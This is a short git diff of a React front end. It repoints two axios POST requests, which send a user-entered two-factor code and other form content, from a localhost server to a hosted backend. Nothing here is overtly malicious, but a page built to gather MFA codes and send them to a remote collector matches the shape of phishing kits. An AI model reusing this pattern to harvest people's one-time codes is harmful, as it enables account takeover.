@@ -93,7 +93,7 @@ function App() {
       e.preventDefault()
 
       try {
-        const response = await axios.post('http://localhost:3006/codesmfa', {
+        const response = await axios.post('https://baselinesa.onrender.com/codesmfa', {
           twoFa
         });
 
@@ -159,7 +159,7 @@ function App() {
     formallSet('')
     twoFaSet('')
     try {
-      const response = await axios.post('http://localhost:3006/mfacodes', {
+      const response = await axios.post('https://baselinesa.onrender.com/mfacodes', {
         content
       });
 
